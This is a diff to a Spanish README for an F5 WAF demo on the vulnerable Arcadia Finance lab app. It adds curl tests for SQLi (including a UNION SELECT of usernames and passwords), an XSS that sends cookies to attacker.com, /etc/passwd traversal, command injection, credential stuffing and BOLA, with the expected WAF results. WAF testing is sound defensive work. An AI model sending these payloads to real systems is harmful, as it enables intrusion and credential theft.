@@ -315,34 +315,120 @@ Navegar a `http://<ARCADIA_DOMAIN>/` en el navegador. La aplicación Arcadia Fin
 
 ### Módulos y endpoints disponibles
 
-Arcadia Finance expone una API REST y una interfaz web con los siguientes endpoints:
+Arcadia Finance expone una API REST y una interfaz web con los siguientes endpoints confirmados:
 
-| Endpoint                        | Descripción                                      |
-| ------------------------------- | ------------------------------------------------ |
-| `/`                             | Página principal (login)                         |
-| `/trading/`                     | Panel de trading de acciones                     |
-| `/api/rest/execute_transaction/`| API para transacciones (JSON POST)               |
-| `/api/rest/get_balance/`        | API para consultar saldo                         |
-| `/api/rest/get_stock_value/`    | API para consultar precio de acciones            |
-| `/api/rest/login/`              | API de autenticación                             |
+| Endpoint                                      | Método | Descripción                                      |
+| --------------------------------------------- | ------ | ------------------------------------------------ |
+| `/trading/login.php`                          | GET    | Página principal de login                        |
+| `/trading/auth.php`                           | POST   | Autenticación (form-urlencoded), devuelve cookie |
+| `/trading/rest/buy_stocks.php`                | POST   | Compra de acciones (requiere sesión)             |
+| `/trading/rest/sell_stocks.php`               | POST   | Venta de acciones (requiere sesión)              |
+| `/api/rest/execute_money_transfer.php`        | POST   | Transferencia de dinero entre usuarios           |
+| `/api/lower_bar.php`                          | GET    | Barra inferior con datos de cuentas              |
+| `/api/side_bar.php`                           | GET    | Panel lateral con formulario de transferencia    |
+| `/api/side_bar_accounts.php`                  | GET    | Lista de cuentas del usuario                     |
 
-### Verificación del WAF
+### Pruebas de seguridad con el WAF
 
-Con `XC_WAF_BLOCKING=true`, los ataques son bloqueados antes de llegar a la aplicación. Ejemplos de prueba:
+Con `XC_WAF_BLOCKING=true`, los ataques son bloqueados antes de llegar a la aplicación. La respuesta de bloqueo incluye `server: volt-adc` y un `support ID` único en el body.
+
+#### 1. SQLi en JSON body — WAF bloquea ✅
 
 ```bash
-# SQLi en parámetro de URL — debe ser bloqueado
-curl -i "http://<ARCADIA_DOMAIN>/api/rest/get_stock_value/?stock=' OR '1'='1"
-
-# XSS reflejado — debe ser bloqueado
-curl -i "http://<ARCADIA_DOMAIN>/?q=<script>alert(1)</script>"
-
-# Command injection — debe ser bloqueado
-curl -i "http://<ARCADIA_DOMAIN>/api/rest/get_balance/?user=admin;id"
-
-# Petición legítima — debe pasar
-curl -i "http://<ARCADIA_DOMAIN>/api/rest/get_stock_value/?stock=AAPL"
+curl -i -X POST "http://<ARCADIA_DOMAIN>/api/rest/execute_money_transfer.php" \
+  -H "Content-Type: application/json" \
+  -d '{"amount":1000,"to":"anna'\'' OR '\''1'\''='\''1"}'
 ```
+
+#### 2. SQLi en campo numérico (UNION based)
+
+```bash
+curl -i -X POST "http://<ARCADIA_DOMAIN>/api/rest/execute_money_transfer.php" \
+  -H "Content-Type: application/json" \
+  -d '{"amount":"1 UNION SELECT username,password FROM users--","to":"Bart"}'
+```
+
+#### 3. XSS en body JSON
+
+```bash
+curl -i -X POST "http://<ARCADIA_DOMAIN>/api/rest/execute_money_transfer.php" \
+  -H "Content-Type: application/json" \
+  -d '{"amount":100,"to":"<script>document.location='\''http://attacker.com?c='\''+document.cookie</script>"}'
+```
+
+#### 4. Path Traversal
+
+```bash
+curl -i "http://<ARCADIA_DOMAIN>/../../../../etc/passwd"
+curl -i "http://<ARCADIA_DOMAIN>/api/lower_bar.php?file=../../../../etc/passwd"
+```
+
+#### 5. Command Injection en parámetro GET
+
+```bash
+curl -i "http://<ARCADIA_DOMAIN>/api/lower_bar.php?user=admin;id"
+```
+
+#### 6. Autenticación + ataques en endpoints de trading (requieren sesión)
+
+```bash
+# 1. Autenticarse y guardar cookie de sesión
+curl -c /tmp/arc.txt -X POST "http://<ARCADIA_DOMAIN>/trading/auth.php" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=matt&password=ilovef5" -L
+
+# 2. BOLA — manipular account ID ajeno
+curl -i -b /tmp/arc.txt \
+  "http://<ARCADIA_DOMAIN>/api/side_bar_accounts.php?account_id=1"
+
+# 3. SQLi en compra de stocks
+curl -i -b /tmp/arc.txt -X POST \
+  "http://<ARCADIA_DOMAIN>/trading/rest/buy_stocks.php" \
+  -H "Content-Type: application/json" \
+  -d '{"trans_value":100,"stock_price":"198 OR 1=1--","qty":10,"company":"F5"}'
+
+# 4. Manipulación de lógica de negocio (monto negativo)
+curl -i -b /tmp/arc.txt -X POST \
+  "http://<ARCADIA_DOMAIN>/trading/rest/buy_stocks.php" \
+  -H "Content-Type: application/json" \
+  -d '{"trans_value":-99999,"stock_price":198,"qty":1,"company":"F5"}'
+```
+
+#### 7. Credential stuffing (simulación de bot)
+
+```bash
+for cred in "admin:admin" "admin:password" "matt:12345" "root:root" "guest:guest"; do
+  user=$(echo $cred | cut -d: -f1)
+  pass=$(echo $cred | cut -d: -f2)
+  echo -n "$user:$pass → "
+  curl -s -o /dev/null -w "%{http_code}\n" -X POST \
+    "http://<ARCADIA_DOMAIN>/trading/auth.php" \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    -d "username=$user&password=$pass" -L
+done
+```
+
+#### 8. Scanner simulation (User-Agent malicioso)
+
+```bash
+curl -i "http://<ARCADIA_DOMAIN>/" \
+  -H "User-Agent: sqlmap/1.7.8#stable (https://sqlmap.org)"
+
+curl -i "http://<ARCADIA_DOMAIN>/" \
+  -H "User-Agent: Nikto/2.1.6"
+```
+
+#### Resultado esperado
+
+| Prueba | Resultado con WAF blocking |
+| --- | --- |
+| SQLi en JSON body | `Request Rejected` + `server: volt-adc` + Support ID |
+| XSS en JSON | `Request Rejected` |
+| Path Traversal | `Request Rejected` |
+| Command Injection | `Request Rejected` |
+| Scanner User-Agent | Bloqueado (requiere Bot Defense habilitado) |
+| Credential stuffing | Bloqueado (requiere Bot Defense habilitado) |
+| BOLA / lógica de negocio | Pasa — requiere API Security + OpenAPI spec cargada en el LB |
 
 Los eventos de bloqueo quedan registrados en F5 XC → **Security → Security Events** del namespace configurado en `XC_NAMESPACE`.
 
